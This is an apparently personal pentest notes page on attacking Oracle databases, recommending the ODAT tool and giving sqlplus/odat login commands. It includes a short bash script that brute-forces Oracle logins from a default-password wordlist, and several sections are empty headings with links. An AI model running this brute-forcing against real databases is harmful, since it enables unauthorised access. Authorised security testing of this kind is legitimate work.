# Oracle Databases

Most of the examples here will be utilizing [ODAT ](https://github.com/quentinhardy/odat), the Oracle Database Attacking Tool.  This is because it has a number of exploits and scanners built in, is generally easier to set up and more stable than metasploit, and can use a lot of metasploits wordlists and data.  Follow the guide in the ODAT readme to ensure that your Kali has all the required tools.

In general I'd recommend this over trying to get Metasploit up and running.  However, if you are still keen then follow [this guide](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux).  For an alternative, see [Andy Gill's guide](https://blog.zsec.uk/msforacle/).



```
/usr/bin/sqlplus64 username/password@192.168.0.5:1521/ORCL  as sysdba
```

Alternatively pass the `--sysdba` flag to odat when logging in:

```
./odat.py all -s 192.168.0.5 -d ORCL -u username -p password --sysdba
```

## SID Enumeration

The SID for Oracle identifies the database instance running.  We can use ODAT to enumerate these SID's and find instances to attack.

## Username Brute-force

```
#!/bin/bash
INPUT=/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
OLDIFS=$IFS
IFS=,
[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
while read comment number username password hash comment
do
 echo "string = $username:$password"
 /usr/lib/oracle/12.2/client64/bin/sqlplus -L $username\/$password\@192.168.0.5:1521\/ORCL | cut -d$'\n' -f 7 
done < $INPUT
IFS=$OLDIFS
```

**Source**: [http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html](http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html)

## Code Execution

## TNS Poisoning

## CVE-2012-3137

[Alternative Script \(untested\)](https://github.com/r1-/cve-2012-3137)

## Further Reading

[Blackhat USA 2009 - Attacking Oracle with the Metasploit Framework](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) & [Paper](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-PAPER.pdf)  
[Oracle DB Vulnerabilities: The Missing Pentester Handbook](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

http://www.ordba.net/Articles/HardeningOracleDB.htm

http://ora-600.pl/art/privilege\_escalation\_2.pdf

